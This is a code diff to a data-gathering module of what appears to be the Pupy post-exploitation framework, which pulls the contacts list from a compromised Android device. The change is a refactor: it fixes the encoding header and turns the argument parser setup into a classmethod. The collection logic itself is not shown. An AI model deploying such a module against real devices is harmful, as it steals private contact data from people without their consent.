@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 #Author: @bobsecq
 #Contributor(s):
 
@@ -6,16 +6,17 @@ __class_name__="contacts"
 
 from pupylib.PupyModule import *
 from pupylib.utils.common import getLocalAndroidPath
-import os, copy 
+import os, copy
 
 @config(cat="gather", compat=["android"])
 class contacts(PupyModule):
     """ to get contacts """
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='contacts', description=self.__doc__)
-        self.arg_parser.add_argument('-a', '--get-all', action='store_true', help='get all contacts')
-        self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='contacts', description=cls.__doc__)
+        cls.arg_parser.add_argument('-a', '--get-all', action='store_true', help='get all contacts')
+        cls.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")
 
     def run(self, args):
         self.client.load_package("pupydroid.contacts")
